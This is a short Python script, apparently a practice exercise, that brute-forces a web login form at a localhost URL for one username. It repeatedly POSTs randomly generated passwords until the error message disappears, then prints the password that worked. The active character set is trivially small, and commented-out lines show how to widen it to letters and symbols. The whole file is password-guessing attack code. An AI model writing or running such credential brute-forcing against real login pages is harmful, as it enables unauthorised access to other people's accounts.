import random
import requests

url = "http://localhost:8081/login"
login="edna2"

#lower_case="abcdefghijklmnopqrstuvwxyz"
#upper_case="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
num="12"
#symbol="[]{}#()*;._=|/?+@&"

#ans = lower_case + upper_case + num + symbol
ans = num

length = 2

#strData = "Welcome to the personal page"
password = "".join(random.sample(ans, length))
data = {'login':login, 'password':password, "submit":'submit'}
send_data_url = requests.post(url, data=data)

while("You entered incorrect data" in str(send_data_url.content)):
    password = "".join(random.sample(ans, length))
    data = {'login':login, 'password':password, "submit":'submit'}
    send_data_url = requests.post(url, data=data)
    if("You entered incorrect data" in str(send_data_url.content)):
        print("Attempting password: ", password)
    else:
        print("Correct password is " ,password)
        break

    













